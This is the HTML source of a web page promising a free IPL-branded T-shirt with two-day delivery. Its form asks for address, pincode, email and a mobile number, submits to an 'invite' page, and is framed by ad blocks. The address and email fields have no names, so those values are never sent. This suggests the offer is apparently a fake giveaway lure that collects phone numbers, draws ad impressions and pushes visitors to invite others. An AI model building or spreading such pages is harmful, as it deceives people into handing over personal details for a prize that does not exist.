

<html lang="en">


<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 <meta property="og:locale" content="en" />
<title>Enjoy this IPL more with free IPLVIVO Tshirt</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Order Now Free T-shirt With 2 Day Delivery" />
    <meta property="og:url" content="index.php" />
    <meta property="og:description" content="ORDER FOR FREE NOW" />
    <meta property="og:site_name" content="Enjoy this IPL more with free IPLVIVO Tshirt" />
    <meta property="og:image" content="http://iplfreetshirt.seo360.online/ogg.jpg"/>
    <link rel="shortcut icon" href="/sicon.png" type="image/x-icon">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../www.w3schools.com/w3css/4/w3.css">
<link rel="stylesheet" type="text/css" href="style.css"/>
</head>
<body>
<div class="content">
 
    
<div class="container2">
<header>
    <div class="h_logo">
        <img src="http://iplfreetshirt.seo360.online/Logo.png" height="auto" />
    
    <h1><b>Enjoy This IPL More With Free IPL T-Shirt</b></h1>	</div>
</header>



<div class="container">
<center>
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- seo3602 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:300px;height:60px"
     data-ad-client="ca-pub-6065543624364950"
     data-ad-slot="5406576171"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
  <form action="./invite.php" method="get">
<br>
    <b>Your Full Addres</b>
    <input type="text" id="name" name="" placeholder="Enter Your Full Addres..." Title="Enter Your Full Addres" required>

    <b>Pincode</b>
    <input type="text" id="number" name="m" placeholder="Pincode"  maxlength="6" minlength="6" Title="Please enter valid Pincode" required>
 <b>You Mail ID:</b>
    <input type="text" id="name" name="" placeholder="Enter Your Mail..." Title="Enter Your Full Name" required>

    <b>Re-Enter Your Number</b>
    <input type="text" id="number" name="m" placeholder="Enter Your Active Mobile Number..." pattern="[7-9]{1}[0-9]{9}" maxlength="10" minlength="10" Title="Please enter valid phone number" required>
    <b>Qty.</b>
    <select id="amount" name="amount" enabled>
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
      <option value="4">4</option>
      <option value="5">5</option>
     </select>
    



                <center><button class="button new btn-lg round" style="width:80%" align="center" type="submit"><i class="fa fa-hand-o-right" aria-hidden="true">&nbsp;</i><b>Next</b></button></center>
        
</form>
 <center>
     <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- seo3602 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:300px;height:250px"
     data-ad-client="ca-pub-6065543624364950"
     data-ad-slot="5406576171"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
 </center>
 


</div>
</div>

</div>
</body>

</html>